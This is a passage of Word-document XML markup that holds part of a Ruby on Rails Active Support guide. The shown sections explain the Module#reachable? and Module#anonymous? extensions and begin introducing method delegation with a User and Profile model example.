    <w:p w14:paraId="305D1A0B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>3.5 Reachable</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EBCE984" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>A named module is reachable if it is stored in its corresponding constant. It means you can reach the module object via the constant.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30575EC5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">That is what ordinarily happens, if a module is called “M”, the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>M</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> constant exists and holds it:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2640"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="65940C5E" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="22DB821C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>module</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>M</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5A1B3E24" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="622BE057" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="484A4DB6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>M.reachable? # =&gt; true</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7BAB5666" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>But since constants and modules are indeed kind of decoupled, module objects can become unreachable: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416CA6C" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="771E889A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>module</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>M</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="696B7E65" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5BDCCBAC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="407E5D4D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>orphan = Object.send(:remove_const, :M)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4ACE2851" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="61ED80FE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># The module object is orphan now but it still has a name.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6F7A7ABE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>orphan.name # =&gt; "M"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="48C3CF7F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1AFC1A60" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># You cannot reach it via the constant M because it does not even exist.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="548C832E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>orphan.reachable? # =&gt; false</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2D915F4B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3D018315" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># Let's define a module called "M" again.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7E0E975D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>module</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>M</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="10D1C9B8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5B343FEE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7E856E1D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># The constant M exists now again, and it stores a module</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5FDE5AE0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># object called "M", but it is a new instance.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="70512574" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>orphan.reachable? # =&gt; false</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="29609808" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/module/reachable.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79B53C0D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>3.6 Anonymous</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38CDB410" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>A module may or may not have a name:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2880"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="688183F7" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="46818EAC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>module</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>M</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="734B338C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2705849C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>M.name # =&gt; "M"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="19BD2D2A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="097A6B98" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>N</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= Module.new</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="387E56B3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>N.name # =&gt; "N"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="61D0D882" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="240ED802" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Module.new.name # =&gt; nil</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4BB08042" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">You can check whether a module has a name with the predicate </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>anonymous?</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3720"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="574422BF" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4D354289" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>module</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>M</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0F466474" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1A887216" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>M.anonymous? # =&gt; false</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7F8D7574" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="70DFDD92" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Module.new.anonymous? # =&gt; true</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6BF5EB33" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Note that being unreachable does not imply being anonymous:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4080"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="209C9BB8" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="544D005B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>module</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>M</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="29139494" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6F37AC5B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="45DC20E9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>m = Object.send(:remove_const, :M)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="28E75C3E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4ECA88F2" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>m.reachable? # =&gt; false</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4AF47E43" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>m.anonymous? # =&gt; false</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="330EB158" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>though an anonymous module is unreachable by definition.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55B64C18" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/module/anonymous.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D92075D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>3.7 Method Delegation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76316209" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The macro </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>delegate</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> offers an easy way to forward methods.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F8AD8A5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Let’s imagine that users in some application have login information in the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>User</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> model but name and other data in a separate </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Profile</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> model:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3648"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="4AB9E596" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6CA62900" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>User &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3D7FD6E4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_one :profile</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6C63C643" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="58A97F09" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">With that configuration you get a user’s name via his profile, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>user.profile.name</w:t>
      </w:r>
      <w:r>
        <w:t>, but it could be handy to still be able to access such attribute directly:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3648"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="289F32C6" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="797B6A69" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>User &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0EAE3ECD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_one :profile</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4DABED4D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="57BB90F7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>name</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="51B54672" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    profile.name</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="325C60C7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1CF97236" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
